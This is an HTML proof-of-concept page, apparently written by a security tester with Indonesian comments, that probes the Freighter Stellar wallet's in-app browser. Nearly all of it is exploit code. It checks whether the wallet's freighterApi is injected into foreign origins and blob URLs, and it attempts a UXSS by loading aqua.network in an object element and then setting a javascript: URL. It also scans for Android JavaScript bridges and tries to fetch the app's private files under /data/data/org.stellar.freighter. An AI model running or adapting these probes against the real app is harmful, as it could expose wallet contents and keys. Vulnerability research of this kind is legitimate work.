<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ALL TESTS FIXED</title>
<style>
*{box-sizing:border-box}body{margin:0;background:#000;color:#0f0;font-family:monospace;padding:12px}
.btn{display:block;width:100%;height:52px;background:#e4e4e7;color:#000;border:none;border-radius:999px;font-weight:800;margin:10px 0}
.log{background:#000;border:1px solid #0f0;color:#0f0;padding:10px;white-space:pre-wrap;min-height:220px;font-size:12px;overflow:auto}
#objWrap{height:1px;overflow:hidden;opacity:0.01}
.card{background:#111;border:1px solid #333;border-radius:12px;padding:10px;margin:10px 0}
</style>
</head>
<body>
<div class="log" id="log">[Ready]</div>
<div class="card">
<button class="btn" onclick="testCurrent()">1. TEST CURRENT ORIGIN</button>
<button class="btn" onclick="testBlob()">2. CREATE BLOB URL & TEST</button>
<button class="btn" onclick="testObject()">3. TRIGGER UXSS OBJECT</button>
<button class="btn" onclick="testBridge()">4. SCAN JS BRIDGES</button>
<button class="btn" onclick="testPrivate()">5. TEST PRIVATE FILES</button>
</div>
<div id="objWrap"><object id="obj" data="about:blank" width="100%"></object></div>
<script>
const logEl=document.getElementById('log');
logEl.textContent=`[Ready]\nhref=${location.href}\norigin=${location.origin}\nprotocol=${location.protocol}\n`;
function L(m){logEl.textContent+=`\n${m}`;logEl.scrollTop=logEl.scrollHeight;}
function testCurrent(){
 L('--- TEST 1 ---');L('freighterApi? '+!!window.freighterApi);
 if(window.freighterApi)L('>>> INJECTED di '+location.protocol+' - kamu di dalam Freighter');
 else L('NOT injected - kamu di luar Freighter (kayak screenshot 12.30 kemarin di Firefox)');
}
function testBlob(){
 L('--- TEST 2 BLOB ---');
 const inner=`<body style="background:#000;color:#0f0"><pre id="o"></pre><script>
 const o=document.getElementById('o');o.textContent='origin:'+location.origin+'\\nfreighterApi?'+!!window.freighterApi;
 if(window.freighterApi)o.textContent+='\\nBUG HIGH di blob:null';else o.textContent+='\\nSECURE';
 <\/script></body>`;
 const url=URL.createObjectURL(new Blob([inner],{type:'text/html'}));
 window.open(url,'_blank');L('Opening blob:'+url);
}
function testObject(){
 L('--- TEST 3 UXSS ---');
 const obj=document.getElementById('obj');obj.data='https://aqua.network';
 setTimeout(()=>{try{obj.data='javascript:alert("UXSS domain="+document.domain)';L('Set to javascript: - if alert aqua.network = CRITICAL');}catch(e){L('Blocked: '+e.message);}},500);
}
function testBridge(){
 L('--- TEST 4 BRIDGE ---');
 for(let k in window){if(k.toLowerCase().includes('android')||k.toLowerCase().includes('bridge')||k.toLowerCase().includes('testbridge'))L('Found window.'+k);}
}
function testPrivate(){
 L('--- TEST 5 file:// ---');L('Save jadi /sdcard/Download/test.html lalu buka file:///sdcard/Download/test.html di Freighter');
 fetch('file:///data/data/org.stellar.freighter/files/').then(r=>r.text()).then(t=>L('READABLE CRITICAL len='+t.length)).catch(e=>L('Blocked SECURE'));
}
testCurrent();
</script>
</body>
</html>
